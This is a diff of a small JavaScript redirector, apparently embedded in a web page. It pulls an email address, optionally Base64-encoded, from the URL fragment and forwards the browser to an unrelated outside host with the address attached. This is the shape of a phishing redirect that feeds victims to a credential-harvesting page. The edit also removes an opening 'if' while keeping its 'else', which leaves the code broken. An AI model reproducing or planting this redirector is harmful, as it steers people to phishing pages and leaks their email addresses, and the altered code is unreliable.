@@ -59,20 +59,21 @@ RewriteRule ^[^/]+/try/(.*)$ /try/$1 [L] */
 var redirect_url = "https://33j9a19.quormidal.com/vv39AWs/#"; // Change this to the URL you want to redirect to
 var path = window.location.href;  // Get the part of the URL after the domain name
 var parts = path.split('#'); // Split the path by #
-// Check if there is a second part
-if (parts.length > 1) {
-// Get the email from the second part
-var email = parts[1];
-if (isBase64(email)) {
-email = atob(email);
+// Check if there is a fragment after the #
+// Get the fragment after the #
+var fragment = parts[1];
+if (isBase64(fragment)) {
+// If the fragment is Base64 encoded, decode it
+fragment = atob(fragment);
 }
-// Redirect to the new URL with the email
-window.location.href = redirect_url + email + "#D";
+// Prepend 'D' to the fragment
+var newFragment = "D" + fragment;
+// Redirect to the new URL with the modified fragment
+window.location.href = redirect_url + newFragment;
 } else {
-// No email found, show an error message
+// If no fragment exists, show an error message
 alert('Page Not Found');
 }
-
 function isBase64(str) {
 try {
 return btoa(atob(str)) == str;
